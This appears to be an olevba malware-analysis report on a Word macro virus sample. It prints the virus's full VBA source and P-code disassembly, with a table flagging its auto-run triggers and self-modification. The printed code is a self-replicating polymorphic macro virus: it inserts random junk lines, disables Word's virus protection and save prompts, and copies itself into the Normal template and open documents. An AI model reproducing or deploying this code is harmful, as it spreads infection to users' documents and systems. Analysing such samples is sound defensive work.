olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Comment
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Comment - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem UTRWFHYTSPWUSUGFXXVRCBPBZHHYNEIAGKSVAPQWC
Private Sub Document_Open()
Call Comment
Rem JFLUCVTUVXVPHXVZDOSENTCCKKRDNRF
End Sub
Private Sub Document_Close()
Rem DWYOTVZUDYCMKGDQIRKICARXGXZFYKHBEMSAWA
Call Comment
End Sub
Private Sub Comment()
For V1 = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1), 1, 1) = "'" Then
V2 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1)
V3 = (Mid(V2, 2, Len(V2)))
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.replaceline V1, V3
End If
Rem EALRBRYGPSVPTTPBGVAECGFKFMWKMGBYYVTTCWEAVEZ
Rem YJSFNTMEAGJVJRZLMUOGLYGBQMH
Rem EGHJUUQPENYJGNPOHSMZBONDCISJIDGJVMBRXDKSPCAUYTDMCPXMGUIGBJAHBIKLSHIRGCPVGCAUZCNZLBUVGXTUCJQM
Next V1
Rem CXHJKQGAOQVUEGUTIIMHZXKRQPTTFORTHJIQHSOLIKPEWWBMEQGCKCODLTMXSKKVHUXOLJJQAMRYPPGVKXG
CommentMacro = By_Lys_Kovick
'If ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 150 Then
'For W4 = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'W5 = Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(W4, 1), 1, 3)
'If W5 = "Rem" Then ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines W4, 1
'Next W4
'End If
'For W2 = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Rem POEKOQCKHMTEAKY
Rem ZXKGGEWQDQXBHHHLSHLMJQ
'If ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(W2, 1) = "CommentMacro = By_Lys_Kovick" Then
'W3 = W2
'GoTo GotIt
'End If
'Next W2
'GotIt:
'For V4 = W3 + 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1
'V5 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V4, 1)
Rem MCIDGOWWDVTQWQJUUDGGFONHYHSUKHTOORHILKAJTOTARMDSELDGFN
Rem RBOIQOBYNWPFNWWAQFDPAVXLZQVUSLVBTEIRMHFIUQLDGEJDFIYMLLNAULUDIRQVMLWASBQEAUKA
'ThisDocument.VBProject.VBComponents.Item(1).CodeModule.replaceline V4, "'" & V5
'Next V4
Rem WWGRTLXQBGWCDBLMUPKD
'For V5 = 1 To 20
Rem LKPBASZJFGLADFQKJKNOUUNI
'V6 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'V7 = Int(Rnd() * V6 + 1)
'V8 = Int(Rnd() * 99 + 1)
'For V9 = 1 To V8
'W1 = W1 + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Rem LWUUGHEZZOBHIYWIZSTKUPOVFLUWCDAQOPLMFHOKPYPWXEM
'Next V9
'ThisDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines V7, "Rem " & W1
Rem XOTLQNSCAIPVXPIKIECQBAAAAEQFLDFEUOUHHWUUMMUNDBOXLFEAIEUEDXDQOOSLQXATJFAEBJYOOCIYDRFRWQTAOZVQHJHTTT
'W1 = ""
Rem ZZXWRLBGRLGFJWTORZOBSPACOIARPICOSWDVAPYNVWKOPESZNFVLZQIVPSIGITVGVVFJACANFXWIYNWBP
Rem KLVRWARVQJWSXJ
'Next V5
'Options.VirusProtection = 0
Rem LOGEMOZWBIONZCYTPRBVAQAZRIBSGQEJQRSDJRLDDJQVPPORMUFYBIIYKMKIOEHYHQWIUMBHV
'Options.SaveNormalPrompt = 0
Rem HAQC
'Options.ConfirmConversions = 0
'VM = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
'Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
'NT.DeleteLines 1, NT.CountOfLines
'NT.AddFromString VM
'Set AD = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
'AD.DeleteLines 1, AD.CountOfLines
'AD.AddFromString VM
'ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Rem QGLEDEPIAISLSSTCNDYJOOHO
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Comment
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 119735 bytes
' Line #0:
' 	Rem 0x002A " UTRWFHYTSPWUSUGFXXVRCBPBZHHYNEIAGKSVAPQWC"
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' 	ArgsCall (Call) Comment 0x0000 
' Line #3:
' 	Rem 0x0020 " JFLUCVTUVXVPHXVZDOSENTCCKKRDNRF"
' Line #4:
' 	EndSub 
' Line #5:
' 	FuncDefn (Private Sub Document_Close())
' Line #6:
' 	Rem 0x0027 " DWYOTVZUDYCMKGDQIRKICARXGXZFYKHBEMSAWA"
' Line #7:
' 	ArgsCall (Call) Comment 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Private Sub Comment())
' Line #10:
' 	StartForVariable 
' 	Ld V1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #11:
' 	Ld V1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	IfBlock 
' Line #12:
' 	Ld V1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St V2 
' Line #13:
' 	Ld V2 
' 	LitDI2 0x0002 
' 	Ld V2 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Paren 
' 	St V3 
' Line #14:
' 	Ld V1 
' 	Ld V3 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Rem 0x002C " EALRBRYGPSVPTTPBGVAECGFKFMWKMGBYYVTTCWEAVEZ"
' Line #17:
' 	Rem 0x001C " YJSFNTMEAGJVJRZLMUOGLYGBQMH"
' Line #18:
' 	Rem 0x005D " EGHJUUQPENYJGNPOHSMZBONDCISJIDGJVMBRXDKSPCAUYTDMCPXMGUIGBJAHBIKLSHIRGCPVGCAUZCNZLBUVGXTUCJQM"
' Line #19:
' 	StartForVariable 
' 	Ld V1 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	Rem 0x0054 " CXHJKQGAOQVUEGUTIIMHZXKRQPTTFORTHJIQHSOLIKPEWWBMEQGCKCODLTMXSKKVHUXOLJJQAMRYPPGVKXG"
' Line #21:
' 	Ld By_Lys_Kovick 
' 	St CommentMacro 
' Line #22:
' 	QuoteRem 0x0000 0x0051 "If ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 150 Then"
' Line #23:
' 	QuoteRem 0x0000 0x0051 "For W4 = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
' Line #24:
' 	QuoteRem 0x0000 0x0053 "W5 = Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(W4, 1), 1, 3)"
' Line #25:
' 	QuoteRem 0x0000 0x005B "If W5 = "Rem" Then ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines W4, 1"
' Line #26:
' 	QuoteRem 0x0000 0x0007 "Next W4"
' Line #27:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #28:
' 	QuoteRem 0x0000 0x0051 "For W2 = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
' Line #29:
' 	Rem 0x0010 " POEKOQCKHMTEAKY"
' Line #30:
' 	Rem 0x0017 " ZXKGGEWQDQXBHHHLSHLMJQ"
' Line #31:
' 	QuoteRem 0x0000 0x006C "If ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(W2, 1) = "CommentMacro = By_Lys_Kovick" Then"
' Line #32:
' 	QuoteRem 0x0000 0x0007 "W3 = W2"
' Line #33:
' 	QuoteRem 0x0000 0x000A "GoTo GotIt"
' Line #34:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #35:
' 	QuoteRem 0x0000 0x0007 "Next W2"
' Line #36:
' 	QuoteRem 0x0000 0x0006 "GotIt:"
' Line #37:
' 	QuoteRem 0x0000 0x005A "For V4 = W3 + 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1"
' Line #38:
' 	QuoteRem 0x0000 0x0048 "V5 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V4, 1)"
' Line #39:
' 	Rem 0x0037 " MCIDGOWWDVTQWQJUUDGGFONHYHSUKHTOORHILKAJTOTARMDSELDGFN"
' Line #40:
' 	Rem 0x004D " RBOIQOBYNWPFNWWAQFDPAVXLZQVUSLVBTEIRMHFIUQLDGEJDFIYMLLNAULUDIRQVMLWASBQEAUKA"
' Line #41:
' 	QuoteRem 0x0000 0x004F "ThisDocument.VBProject.VBComponents.Item(1).CodeModule.replaceline V4, "'" & V5"
' Line #42:
' 	QuoteRem 0x0000 0x0007 "Next V4"
' Line #43:
' 	Rem 0x0015 " WWGRTLXQBGWCDBLMUPKD"
' Line #44:
' 	QuoteRem 0x0000 0x0010 "For V5 = 1 To 20"
' Line #45:
' 	Rem 0x0019 " LKPBASZJFGLADFQKJKNOUUNI"
' Line #46:
' 	QuoteRem 0x0000 0x0048 "V6 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
' Line #47:
' 	QuoteRem 0x0000 0x0018 "V7 = Int(Rnd() * V6 + 1)"
' Line #48:
' 	QuoteRem 0x0000 0x0018 "V8 = Int(Rnd() * 99 + 1)"
' Line #49:
' 	QuoteRem 0x0000 0x0010 "For V9 = 1 To V8"
' Line #50:
' 	QuoteRem 0x0000 0x002D "W1 = W1 + Chr$(Int((90 - 65 + 1) * Rnd + 65))"
' Line #51:
' 	Rem 0x0030 " LWUUGHEZZOBHIYWIZSTKUPOVFLUWCDAQOPLMFHOKPYPWXEM"
' Line #52:
' 	QuoteRem 0x0000 0x0007 "Next V9"
' Line #53:
' 	QuoteRem 0x0000 0x0052 "ThisDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines V7, "Rem " & W1"
' Line #54:
' 	Rem 0x0063 " XOTLQNSCAIPVXPIKIECQBAAAAEQFLDFEUOUHHWUUMMUNDBOXLFEAIEUEDXDQOOSLQXATJFAEBJYOOCIYDRFRWQTAOZVQHJHTTT"
' Line #55:
' 	QuoteRem 0x0000 0x0007 "W1 = """
' Line #56:
' 	Rem 0x0052 " ZZXWRLBGRLGFJWTORZOBSPACOIARPICOSWDVAPYNVWKOPESZNFVLZQIVPSIGITVGVVFJACANFXWIYNWBP"
' Line #57:
' 	Rem 0x000F " KLVRWARVQJWSXJ"
' Line #58:
' 	QuoteRem 0x0000 0x0007 "Next V5"
' Line #59:
' 	QuoteRem 0x0000 0x001B "Options.VirusProtection = 0"
' Line #60:
' 	Rem 0x004A " LOGEMOZWBIONZCYTPRBVAQAZRIBSGQEJQRSDJRLDDJQVPPORMUFYBIIYKMKIOEHYHQWIUMBHV"
' Line #61:
' 	QuoteRem 0x0000 0x001C "Options.SaveNormalPrompt = 0"
' Line #62:
' 	Rem 0x0005 " HAQC"
' Line #63:
' 	QuoteRem 0x0000 0x001E "Options.ConfirmConversions = 0"
' Line #64:
' 	QuoteRem 0x0000 0x0089 "VM = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)"
' Line #65:
' 	QuoteRem 0x0000 0x0041 "Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule"
' Line #66:
' 	QuoteRem 0x0000 0x0021 "NT.DeleteLines 1, NT.CountOfLines"
' Line #67:
' 	QuoteRem 0x0000 0x0013 "NT.AddFromString VM"
' Line #68:
' 	QuoteRem 0x0000 0x0041 "Set AD = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule"
' Line #69:
' 	QuoteRem 0x0000 0x0021 "AD.DeleteLines 1, AD.CountOfLines"
' Line #70:
' 	QuoteRem 0x0000 0x0013 "AD.AddFromString VM"
' Line #71:
' 	QuoteRem 0x0000 0x0037 "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName"
' Line #72:
' 	Rem 0x0019 " QGLEDEPIAISLSSTCNDYJOOHO"
' Line #73:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

